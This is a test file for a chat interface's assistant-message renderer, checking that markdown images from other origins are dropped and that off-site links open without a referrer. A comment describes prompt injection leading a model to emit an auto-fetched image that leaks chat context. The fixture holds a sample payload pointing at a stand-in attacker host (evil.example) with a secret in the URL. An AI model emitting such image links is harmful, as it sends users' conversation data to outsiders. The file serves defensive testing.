import "@testing-library/jest-dom/vitest";
import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { TooltipProvider } from "@/components/ui/tooltip";
import { MessageBubble } from "../ChatMessage";

vi.mock("react-i18next", async (importOriginal) => ({
  ...(await importOriginal<typeof import("react-i18next")>()),
  useTranslation: () => ({ i18n: { language: "en" }, t: (key: string) => key }),
}));

// Upstream #24716: a prompt injection can make the model emit an image the
// browser would fetch without a click, carrying chat context in its URL.
describe("assistant markdown", () => {
  const reply =
    "![leaked alt](https://evil.example/x.png?d=secret) " +
    "![local](/api/events/abc/thumbnail.webp) " +
    "[offsite](https://evil.example/page) [home](/review)";

  const renderReply = () =>
    render(
      <TooltipProvider>
        <MessageBubble messageRole="assistant" content={reply} />
      </TooltipProvider>,
    );

  it("renders only same-origin images", () => {
    const { container } = renderReply();
    expect(screen.getByText(/leaked alt/)).toBeInTheDocument();
    const sources = Array.from(container.querySelectorAll("img")).map((img) =>
      img.getAttribute("src"),
    );
    expect(sources).toEqual(["/api/events/abc/thumbnail.webp"]);
  });

  it("opens off-origin links in a new tab without a referrer", () => {
    renderReply();
    const offsite = screen.getByRole("link", { name: "offsite" });
    expect(offsite).toHaveAttribute("target", "_blank");
    expect(offsite).toHaveAttribute("rel", "noopener noreferrer");
    const home = screen.getByRole("link", { name: "home" });
    expect(home).not.toHaveAttribute("target");
    expect(home).not.toHaveAttribute("rel");
  });
});
